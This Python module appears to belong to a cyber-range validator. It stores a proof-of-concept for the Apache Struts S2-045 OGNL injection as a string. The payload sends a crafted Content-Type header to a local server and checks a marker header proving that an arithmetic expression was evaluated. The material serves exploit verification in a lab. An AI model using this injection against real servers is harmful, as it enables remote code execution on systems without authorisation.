"""Runner-owned PoCs with concrete, code-specific evidence verifiers."""
from __future__ import annotations

import hashlib

STRUTS_S2045_PROOF_ID = "struts-s2045-ognl-header"
STRUTS_S2045_SOURCE = "local://cyberrange/validator/struts-s2045-arithmetic"
STRUTS_S2045_MARKER = "VULHUB_HEADER=54289"
STRUTS_S2045_PAYLOAD = """import urllib.request
content_type = ("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
                ".addHeader('vulhub',233*233)}.multipart/form-data")
r = urllib.request.Request('http://127.0.0.1:8080/', data=b'',
                           headers={'Content-Type': content_type})
try:
    resp = urllib.request.urlopen(r, timeout=8)
    print('VULHUB_HEADER=' + str(resp.headers.get('vulhub')))
except Exception as exc:
    print('REQUEST_ERROR=' + type(exc).__name__ + ':' + str(exc))
"""

STRUTS_S2045_SHA256 = hashlib.sha256(STRUTS_S2045_PAYLOAD.encode("utf-8")).hexdigest()

KNOWN_POC_PROOFS = {
    STRUTS_S2045_PROOF_ID: {
        "source_url": STRUTS_S2045_SOURCE,
        "sha256": STRUTS_S2045_SHA256,
        "exec_method": "http_seq",
        "payload": STRUTS_S2045_PAYLOAD,
        "expected_marker": STRUTS_S2045_MARKER,
    },
}
